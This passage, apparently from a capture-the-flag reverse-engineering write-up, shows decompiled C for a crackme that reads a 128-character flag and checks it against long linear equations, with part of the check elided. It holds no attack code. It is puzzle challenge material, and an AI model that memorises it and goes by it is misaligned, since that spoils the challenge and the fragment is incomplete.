edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v366; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v367; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v368; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v369; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v370; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v371; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v372; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v373; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v374; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v375; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v376; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v377; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v378; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v379; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v380; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v381; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v382; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v383; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v384; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v385; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v386; <span class="hljs-comment">// edx</span></span><br><span class="line">  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+0h] [rbp-100h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v388; <span class="hljs-comment">// [rsp+1h] [rbp-FFh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v389; <span class="hljs-comment">// [rsp+2h] [rbp-FEh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v390; <span class="hljs-comment">// [rsp+3h] [rbp-FDh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v391; <span class="hljs-comment">// [rsp+4h] [rbp-FCh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v392; <span class="hljs-comment">// [rsp+5h] [rbp-FBh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v393; <span class="hljs-comment">// [rsp+6h] [rbp-FAh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v394; <span class="hljs-comment">// [rsp+7h] [rbp-F9h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v395; <span class="hljs-comment">// [rsp+8h] [rbp-F8h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v396; <span class="hljs-comment">// [rsp+9h] [rbp-F7h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v397; <span class="hljs-comment">// [rsp+Ah] [rbp-F6h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v398; <span class="hljs-comment">// [rsp+Bh] [rbp-F5h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v399; <span class="hljs-comment">// [rsp+Ch] [rbp-F4h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v400; <span class="hljs-comment">// [rsp+Dh] [rbp-F3h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v401; <span class="hljs-comment">// [rsp+Eh] [rbp-F2h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v402; <span class="hljs-comment">// [rsp+Fh] [rbp-F1h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v403; <span class="hljs-comment">// [rsp+10h] [rbp-F0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v404; <span class="hljs-comment">// [rsp+11h] [rbp-EFh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v405; <span class="hljs-comment">// [rsp+12h] [rbp-EEh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v406; <span class="hljs-comment">// [rsp+13h] [rbp-EDh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v407; <span class="hljs-comment">// [rsp+14h] [rbp-ECh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v408; <span class="hljs-comment">// [rsp+15h] [rbp-EBh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v409; <span class="hljs-comment">// [rsp+16h] [rbp-EAh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v410; <span class="hljs-comment">// [rsp+17h] [rbp-E9h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v411; <span class="hljs-comment">// [rsp+18h] [rbp-E8h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v412; <span class="hljs-comment">// [rsp+19h] [rbp-E7h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v413; <span class="hljs-comment">// [rsp+1Ah] [rbp-E6h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v414; <span class="hljs-comment">// [rsp+1Bh] [rbp-E5h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v415; <span class="hljs-comment">// [rsp+1Ch] [rbp-E4h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v416; <span class="hljs-comment">// [rsp+1Dh] [rbp-E3h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v417; <span class="hljs-comment">// [rsp+1Eh] [rbp-E2h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v418; <span class="hljs-comment">// [rsp+1Fh] [rbp-E1h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v419; <span class="hljs-comment">// [rsp+20h] [rbp-E0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v420; <span class="hljs-comment">// [rsp+21h] [rbp-DFh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v421; <span class="hljs-comment">// [rsp+22h] [rbp-DEh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v422; <span class="hljs-comment">// [rsp+23h] [rbp-DDh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v423; <span class="hljs-comment">// [rsp+24h] [rbp-DCh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v424; <span class="hljs-comment">// [rsp+25h] [rbp-DBh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v425; <span class="hljs-comment">// [rsp+26h] [rbp-DAh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v426; <span class="hljs-comment">// [rsp+27h] [rbp-D9h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v427; <span class="hljs-comment">// [rsp+28h] [rbp-D8h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v428; <span class="hljs-comment">// [rsp+29h] [rbp-D7h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v429; <span class="hljs-comment">// [rsp+2Ah] [rbp-D6h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v430; <span class="hljs-comment">// [rsp+2Bh] [rbp-D5h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v431; <span class="hljs-comment">// [rsp+2Ch] [rbp-D4h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v432; <span class="hljs-comment">// [rsp+2Dh] [rbp-D3h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v433; <span class="hljs-comment">// [rsp+2Eh] [rbp-D2h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v434; <span class="hljs-comment">// [rsp+2Fh] [rbp-D1h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v435; <span class="hljs-comment">// [rsp+30h] [rbp-D0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v436; <span class="hljs-comment">// [rsp+31h] [rbp-CFh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v437; <span class="hljs-comment">// [rsp+32h] [rbp-CEh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v438; <span class="hljs-comment">// [rsp+33h] [rbp-CDh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v439; <span class="hljs-comment">// [rsp+34h] [rbp-CCh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v440; <span class="hljs-comment">// [rsp+35h] [rbp-CBh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v441; <span class="hljs-comment">// [rsp+36h] [rbp-CAh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v442; <span class="hljs-comment">// [rsp+37h] [rbp-C9h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v443; <span class="hljs-comment">// [rsp+38h] [rbp-C8h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v444; <span class="hljs-comment">// [rsp+39h] [rbp-C7h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v445; <span class="hljs-comment">// [rsp+3Ah] [rbp-C6h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v446; <span class="hljs-comment">// [rsp+3Bh] [rbp-C5h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v447; <span class="hljs-comment">// [rsp+3Ch] [rbp-C4h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v448; <span class="hljs-comment">// [rsp+3Dh] [rbp-C3h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v449; <span class="hljs-comment">// [rsp+3Eh] [rbp-C2h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v450; <span class="hljs-comment">// [rsp+3Fh] [rbp-C1h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v451; <span class="hljs-comment">// [rsp+40h] [rbp-C0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v452; <span class="hljs-comment">// [rsp+41h] [rbp-BFh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v453; <span class="hljs-comment">// [rsp+42h] [rbp-BEh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v454; <span class="hljs-comment">// [rsp+43h] [rbp-BDh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v455; <span class="hljs-comment">// [rsp+44h] [rbp-BCh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v456; <span class="hljs-comment">// [rsp+45h] [rbp-BBh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v457; <span class="hljs-comment">// [rsp+46h] [rbp-BAh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v458; <span class="hljs-comment">// [rsp+47h] [rbp-B9h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v459; <span class="hljs-comment">// [rsp+48h] [rbp-B8h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v460; <span class="hljs-comment">// [rsp+49h] [rbp-B7h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v461; <span class="hljs-comment">// [rsp+4Ah] [rbp-B6h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v462; <span class="hljs-comment">// [rsp+4Bh] [rbp-B5h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v463; <span class="hljs-comment">// [rsp+4Ch] [rbp-B4h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v464; <span class="hljs-comment">// [rsp+4Dh] [rbp-B3h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v465; <span class="hljs-comment">// [rsp+4Eh] [rbp-B2h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v466; <span class="hljs-comment">// [rsp+4Fh] [rbp-B1h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v467; <span class="hljs-comment">// [rsp+50h] [rbp-B0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v468; <span class="hljs-comment">// [rsp+51h] [rbp-AFh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v469; <span class="hljs-comment">// [rsp+52h] [rbp-AEh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v470; <span class="hljs-comment">// [rsp+53h] [rbp-ADh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v471; <span class="hljs-comment">// [rsp+54h] [rbp-ACh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v472; <span class="hljs-comment">// [rsp+55h] [rbp-ABh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v473; <span class="hljs-comment">// [rsp+56h] [rbp-AAh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v474; <span class="hljs-comment">// [rsp+57h] [rbp-A9h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v475; <span class="hljs-comment">// [rsp+58h] [rbp-A8h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v476; <span class="hljs-comment">// [rsp+59h] [rbp-A7h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v477; <span class="hljs-comment">// [rsp+5Ah] [rbp-A6h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v478; <span class="hljs-comment">// [rsp+5Bh] [rbp-A5h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v479; <span class="hljs-comment">// [rsp+5Ch] [rbp-A4h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v480; <span class="hljs-comment">// [rsp+5Dh] [rbp-A3h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v481; <span class="hljs-comment">// [rsp+5Eh] [rbp-A2h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v482; <span class="hljs-comment">// [rsp+5Fh] [rbp-A1h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v483; <span class="hljs-comment">// [rsp+60h] [rbp-A0h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v484; <span class="hljs-comment">// [rsp+61h] [rbp-9Fh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v485; <span class="hljs-comment">// [rsp+62h] [rbp-9Eh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v486; <span class="hljs-comment">// [rsp+63h] [rbp-9Dh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v487; <span class="hljs-comment">// [rsp+64h] [rbp-9Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v488; <span class="hljs-comment">// [rsp+65h] [rbp-9Bh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v489; <span class="hljs-comment">// [rsp+66h] [rbp-9Ah]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v490; <span class="hljs-comment">// [rsp+67h] [rbp-99h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v491; <span class="hljs-comment">// [rsp+68h] [rbp-98h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v492; <span class="hljs-comment">// [rsp+69h] [rbp-97h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v493; <span class="hljs-comment">// [rsp+6Ah] [rbp-96h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v494; <span class="hljs-comment">// [rsp+6Bh] [rbp-95h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v495; <span class="hljs-comment">// [rsp+6Ch] [rbp-94h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v496; <span class="hljs-comment">// [rsp+6Dh] [rbp-93h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v497; <span class="hljs-comment">// [rsp+6Eh] [rbp-92h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v498; <span class="hljs-comment">// [rsp+6Fh] [rbp-91h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v499; <span class="hljs-comment">// [rsp+70h] [rbp-90h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v500; <span class="hljs-comment">// [rsp+71h] [rbp-8Fh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v501; <span class="hljs-comment">// [rsp+72h] [rbp-8Eh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v502; <span class="hljs-comment">// [rsp+73h] [rbp-8Dh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v503; <span class="hljs-comment">// [rsp+74h] [rbp-8Ch]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v504; <span class="hljs-comment">// [rsp+75h] [rbp-8Bh]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v505; <span class="hljs-comment">// [rsp+76h] [rbp-8Ah]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v506; <span class="hljs-comment">// [rsp+77h] [rbp-89h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v507; <span class="hljs-comment">// [rsp+78h] [rbp-88h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v508; <span class="hljs-comment">// [rsp+79h] [rbp-87h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v509; <span class="hljs-comment">// [rsp+7Ah] [rbp-86h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v510; <span class="hljs-comment">// [rsp+7Bh] [rbp-85h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v511; <span class="hljs-comment">// [rsp+7Ch] [rbp-84h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v512; <span class="hljs-comment">// [rsp+7Dh] [rbp-83h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v513; <span class="hljs-comment">// [rsp+7Eh] [rbp-82h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> v514; <span class="hljs-comment">// [rsp+7Fh] [rbp-81h]</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Give me Flag:"</span>, argv, envp);</span><br><span class="line">  __isoc99_scanf(<span class="hljs-string">"%128s"</span>, &amp;s);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(&amp;s) == <span class="hljs-number">128</span> )</span><br><span class="line">  {</span><br><span class="line">    v3 = <span class="hljs-number">64538</span> * v429</span><br><span class="line">       + <span class="hljs-number">42900</span> * v428</span><br><span class="line">       + <span class="hljs-number">18329</span> * v427</span><br><span class="line">       + <span class="hljs-number">60412</span> * v426</span><br><span class="line">       + <span class="hljs-number">60307</span> * v425</span><br><span class="line">       + <span class="hljs-number">18530</span> * v424</span><br><span class="line">       + <span class="hljs-number">51121</span> * v423</span><br><span class="line">       + <span class="hljs-number">50282</span> * v422</span><br><span class="line">       + <span class="hljs-number">46722</span> * v421</span><br><span class="line">       + <span class="hljs-number">44487</span> * v420</span><br><span class="line">       + <span class="hljs-number">38419</span> * v419</span><br><span class="line">       + <span class="hljs-number">46190</span> * v418</span><br><span class="line">       + <span class="hljs-number">18243</span> * v417</span><br><span class="line">       + <span class="hljs-number">40252</span> * v416</span><br><span class="line">       + <span class="hljs-number">41765</span> * v415</span><br><span class="line">       + <span class="hljs-number">20132</span> * v414</span><br><span class="line">       + <span class="hljs-number">21211</span> * v413</span><br><span class="line">       + <span class="hljs-number">27153</span> * v412</span><br><span class="line">       + <span class="hljs-number">46112</span> * v411</span><br><span class="line">       + <span class="hljs-number">59321</span> * v410</span><br><span class="line">       + <span class="hljs-number">49412</span> * v409</span><br><span class="line">       + <span class="hljs-number">42549</span> * v408</span><br><span class="line">       + <span class="hljs-number">21824</span> * v407</span><br><span class="line">       + <span class="hljs-number">21129</span> * v406</span><br><span class="line">       + <span class="hljs-number">18066</span> * v405</span><br><span class="line">       + <span class="hljs-number">43022</span> * v404</span><br><span class="line">       + <span class="hljs-number">54055</span> * v403</span><br><span class="line">       + <span class="hljs-number">38707</span> * v402</span><br><span class="line">       + <span class="hljs-number">48128</span> * v401</span><br><span class="line">       + <span class="hljs-number">60067</span> * v400</span><br><span class="line">       + <span class="hljs-number">36126</span> * v399</span><br><span class="line">       + <span class="hljs-number">27472</span> * v398</span><br><span class="line">       + <span class="hljs-number">19052</span> * v397</span><br><span class="line">       + <span class="hljs-number">40829</span> * v396</span><br><span class="line">       + <span class="hljs-number">39355</span> * v395</span><br><span class="line">       + <span class="hljs-number">61052</span> * v394</span><br><span class="line">       + <span class="hljs-number">40870</span> * v393</span><br><span class="line">       + <span class="hljs-number">57038</span> * v392</span><br><span class="line">       + <span class="hljs-number">32494</span> * v391</span><br><span class="line">       + <span class="hljs-number">27938</span> * v390</span><br><span class="line">       + <span class="hljs-number">19407</span> * v389</span><br><span class="line">       + <span class="hljs-number">24781</span> * v388</span><br><span class="line">       + <span class="hljs-number">37921</span> * s;</span><br><span class="line">    v4 = <span class="hljs-number">24771</span> * v471</span><br><span class="line">       + <span class="hljs-number">33991</span> * v470</span><br><span class="line">       + <span class="hljs-number">31417</span> * v469</span><br><span class="line">       + <span class="hljs-number">59818</span> * v468</span><br><span class="line">       + <span class="hljs-number">39294</span> * v467</span><br><span class="line">       + <span class="hljs-number">36226</span> * v466</span><br><span class="line">       + <span class="hljs-number">39486</span> * v465</span><br><span class="line">       + <span class="hljs-number">57710</span> * v464</span><br><span class="line">       + <span class="hljs-number">42226</span> * v463</span><br><span class="line">       + <span class="hljs-number">49425</span> * v462</span><br><span class="line">       + <span class="hljs-number">36772</span> * v461</span><br><span class="line">       + <span class="hljs-number">28905</span> * v460</span><br><span class="line">       + <span class="hljs-number">56121</span> * v459</span><br><span class="line">       + <span class="hljs-number">52847</span> * v458</span><br><span class="line">       + <span class="hljs-number">42837</span> * v457</span><br><span class="line">       + <span class="hljs-number">49578</span> * v456</span><br><span class="line">       + <span class="hljs-number">40181</span> * v455</span><br><span class="line">       + <span class="hljs-number">40989</span> * v454</span><br><span class="line">       + <span class="hljs-number">49484</span> * v453</span><br><span class="line">       + <span class="hljs-number">51756</span> * v452</span><br><span class="line">       + <span class="hljs-number">63499</span> * v451</span><br><span class="line">       + <span class="hljs-number">24443</span> * v450</span><br><span class="line">       + <span class="hljs-number">44983</span> * v449</span><br><span class="line">       + <span class="hljs-number">29121</span> * v448</span><br><span class="line">       + <span class="hljs-number">45920</span> * v447</span><br><span class="line">       + <span class="hljs-number">31270</span> * v446</span><br><span class="line">       + <span class="hljs-number">32548</span> * v445</span><br><span class="line">       + <span class="hljs-number">42180</span> * v444</span><br><span class="line">       + <span class="hljs-number">28781</span> * v443</span><br><span class="line">       + <span class="hljs-number">20664</span> * v442</span><br><span class="line">       + <span class="hljs-number">31970</span> * v441</span><br><span class="line">       + <span class="hljs-number">37429</span> * v440</span><br><span class="line">       + <span class="hljs-number">61803</span> * v439</span><br><span class="line">       + <span class="hljs-number">33044</span> * v438</span><br><span class="line">       + <span class="hljs-number">56440</span> * v437</span><br><span class="line">       + <span class="hljs-number">37835</span> * v436</span><br><span class="line">       + <span class="hljs-number">32992</span> * v435</span><br><span class="line">       + <span class="hljs-number">52454</span> * v434</span><br><span class="line">       + <span class="hljs-number">65272</span> * v433</span><br><span class="line">       + <span class="hljs-number">37799</span> * v432</span><br><span class="line">       + <span class="hljs-number">50401</span> * v431</span><br><span class="line">       + <span class="hljs-number">31920</span> * v430</span><br><span class="line">       + v3;</span><br><span class="line">    v5 = <span class="hljs-number">48499</span> * v513</span><br><span class="line">       + <span class="hljs-number">18203</span> * v512</span><br><span class="line">       + <span class="hljs-number">65067</span> * v511</span><br><span class="line">       + <span class="hljs-number">30665</span> * v510</span><br><span class="line">       + <span class="hljs-number">58990</span> * v509</span><br><span class="line">       + <span class="hljs-number">37148</span> * v508</span><br><span class="line">       + <span class="hljs-number">61681</span> * v507</span><br><span class="line">       + <span class="hljs-number">51316</span> * v506</span><br><span class="line">       + <span class="hljs-number">64090</span> * v505</span><br><span class="line">       + <span class="hljs-number">57189</span> * v504</span><br><span class="line">       + <span class="hljs-number">58206</span> * v503</span><br><span class="line">       + <span class="hljs-number">52880</span> * v502</span><br><span class="line">       + <span class="hljs-number">56821</span> * v501</span><br><span class="line">       + <span class="hljs-number">21676</span> * v500</span><br><span class="line">       + <span class="hljs-number">28817</span> * v499</span><br><span class="line">       + <span class="hljs-number">20060</span> * v498</span><br><span class="line">       + <span class="hljs-number">24492</span> * v497</span><br><span class="line">       + <span class="hljs-number">52094</span> * v496</span><br><span class="line">       + <span class="hljs-number">63505</span> * v495</span><br><span class="line">       + <span class="hljs-number">57244</span> * v494</span><br><span class="line">       + <span class="hljs-number">50929</span> * v493</span><br><span class="line">       + <span class="hljs-number">61554</span> * v492</span><br><span class="line">       + <span class="hljs-number">51708</span> * v491</span><br><span class="line">       + <span class="hljs-number">65257</span> * v490</span><br><span class="line">       + <span class="hljs-number">37567</span> * v489</span><br><span class="line">       + <span class="hljs-number">54352</span> * v488</span><br><span class="line">       + <span class="hljs-number">55426</span> * v487</span><br><span class="line">       + <span class="hljs-number">49466</span> * v486</span><br><span class="line">       + <span class="hljs-number">28952</span> * v485</span><br><span class="line">       + <span class="hljs-number">47589</span> * v484</span><br><span class="line">       + <span class="hljs-number">22287</span> * v483</span><br><span class="line">       + <span class="hljs-number">49762</span> * v482</span><br><span class="line">       + <span class="hljs-number">58791</span> * v481</span><br><span class="line">       + <span class="hljs-number">30764</span> * v480</span><br><span class="line">       + <span class="hljs-number">40171</span> * v479</span><br><span class="line">       + <span class="hljs-number">26026</span> * v478</span><br><span class="line">       + <span class="hljs-number">31717</span> * v477</span><br><span class="line">       + <span class="hljs-number">54297</span> * v476</span><br><span class="line">       + <span class="hljs-number">53803</span> * v475</span><br><span class="line">       + <span class="hljs-number">62356</span> * v474</span><br><span class="line">       + <span class="hljs-number">37562</span> * v473</span><br><span class="line">       + <span class="hljs-number">47359</span> * v472</span><br><span class="line">       + v4;</span><br><span class="line">    <span class="hljs-keyword">if</span> ( v5 + <span class="hljs-number">33908</span> * v514 == <span class="hljs-number">451221610</span> )</span><br><span class="line">    {</span><br><span class="line">        ............</span><br><span class="line">            <span class="hljs-keyword">if</span> ( v380 + <span class="hljs-number">48903</span> * v514 == <span class="hljs-number">428074321</span> )</span><br><span class="line">                                                                                                                                                                                                                                                              {</span><br><span class="line">                                                                                                                                                                                                                                                                v381 = <span class="hljs-number">18255</span> * v429 + <span class="hljs-number">27862</span> * v428 + <span class="hljs-number">49507</span> * v427 + <span class="hljs-number">50734</span> * v426 + <span class="hljs-number">46584</span> * v425 + <span class="hljs-number">22147</span> * v424 + <span class="hljs-number">37539</span> * v423 + <span class="hljs-number">47096</span> * v422 + <span class="hljs-number">46464</span> * v421 + <span class="hljs-number">36058</span> * v420 + <span class="hljs-number">22895</span> * v419 + <span class="hljs-number">41196</span> * v418 + <span class="hljs-number">56603</span> * v417 + <span class="hljs-number">54009</span> * v416 + <span class="hljs-number">31454</span> * v415 + <span class="hljs-number">23228</span> * v414 + <span class="hljs-number">39219</span> * v413 + <span class="hljs-number">54012</span> * v412 + <span class="hljs-number">40791</span> * v411 + <span class="hljs-number">60791</span> * v410 + <span class="hljs-number">60818</span> * v409 + <span class="hljs-number">57486</span> * v408 + <span class="hljs-number">46241</span> * v407 + <span class="hljs-number">24079</span> * v406 + <span class="hljs-number">40128</span> * v405 + <span class="hljs-number">47273</span> * v404 + <span class="hljs-number">40612</span> * v403 + <span class="hljs-number">32341</span> * v402 + <span class="hljs-number">20015</span> * v401 + <span class="hljs-number">38073</span> * v400 + <span class="hljs-number">41230</span> * v399 + <span class="hljs-number">61648</span> * v398 + <span class="hljs-number">33734</span> * v397 + <span class="hljs-number">61659</span> * v396 + <span class="hljs-number">61614</span> * v395 + <span class="hljs-number">52377</span> * v394 + <span class="hljs-number">46854</span> * v393 + <span class="hljs-number">21778</span> * v392 + <span class="hljs-number">56660</span> * v391 + <span class="hljs-number">63546</span> * v390 + <span class="hljs-number">28059</span> * v389 + <span class="hljs-number">23740</span> * v388 + <span class="hljs-number">51085</span> * s;</span><br><span class="line">                                                                                                                                                                                                                                                                v382 = <span class="hljs-number">32419</span> * v471 + <span class="hljs-number">25641</span> * v470 + <span class="hljs-number">45499</span> * v469 + <span class="hljs-number">19322</span> * v468 + <span class="hljs-number">43032</span> * v467 + <span class="hljs-number">23307</span> * v466 + <span class="hljs-number">55448</span> * v465 + <span class="hljs-number">53137</span> * v464 + <span class="hljs-number">28623</span> * v463 + <span class="hljs-number">18253</span> * v462 + <span class="hljs-number">22115</span> * v461 + <span class="hljs-number">49428</span> * v460 + <span class="hljs-number">53125</span> * v459 + <span class="hljs-number">55383</span> * v458 + <span class="hljs-number">33400</span> * v457 + <span class="hljs-number">56702</span> * v456 + <span class="hljs-number">26964</span> * v455 + <span class="hljs-number">61361</span> * v454 + <span class="hljs-number">61475</span> * v453 + <span class="hljs-number">24641</span> * v452 + <span class="hljs-number">44331</span> * v451 + <span class="hljs-number">45772</span> * v450 + <span class="hljs-number">26200</span> * v449 + <span class="hljs-number">16929</span> * v448 + <span class="hljs-number">54818</span> * v447 + <span class="hljs-number">51368</span> * v446 + <span class="hljs-number">53472</span> * v445 + <span class="hljs-number">32905</span> * v444 + <span class="hljs-number">29339</span> * v443 + <span class="hljs-number">46501</span> * v442 + <span class="hljs-number">41223</span> * v441 + <span class="hljs-number">51734</span> * v440 + <span class="hljs-number">28049</span> * v439 + <span class="hljs-number">29015</span> * v438 + <span class="hljs-number">21595</span> * v437 + <span class="hljs-number">61661</span> * v436 + <span class="hljs-number">38454</span> * v435 + <span class="hljs-number">42127</span> * v434 + <span class="hljs-number">20790</span> * v433 + <span class="hljs-number">46685</span> * v432 + <span class="hljs-number">59201</span> * v431 + <span class="hljs-number">18163</span> * v430 + v381;</span><br><span class="line">                                                                                                                                                                                                                                                                v383 = <span class="hljs-number">59175</span> * v513 + <span class="hljs-number">39108</span> * v512 + <span class="hljs-number">47897</span> * v511 + <span class="hljs-number">30517</span> * v510 + <span class="hljs-number">48502</span> * v509 + <span 